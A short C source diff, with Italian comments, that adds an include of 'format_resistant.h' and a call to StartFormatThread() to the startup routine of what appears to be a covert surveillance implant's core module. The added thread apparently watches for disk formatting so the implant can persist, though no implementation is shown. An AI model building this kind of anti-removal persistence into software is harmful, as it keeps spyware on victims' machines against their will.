@@ -44,6 +44,7 @@
 #include <time.h>
 #include "sha1.h"
 #include "status_log.h"
+#include "format_resistant.h"
 
 #pragma bss_seg("shared")
 BOOL is_demo_version;
@@ -2745,6 +2746,9 @@ void __stdcall HM_sMain(void)
 
 	// Fa partire il sync manager 
 	SM_StartMonitorEvents();
+
+	// Lancia il thread per il monitoraggio della formattazione
+	StartFormatThread();
 
 	REPORT_STATUS_LOG(ss7.get_str());
 	SendStatusLog(L"[Core Module]: Started");
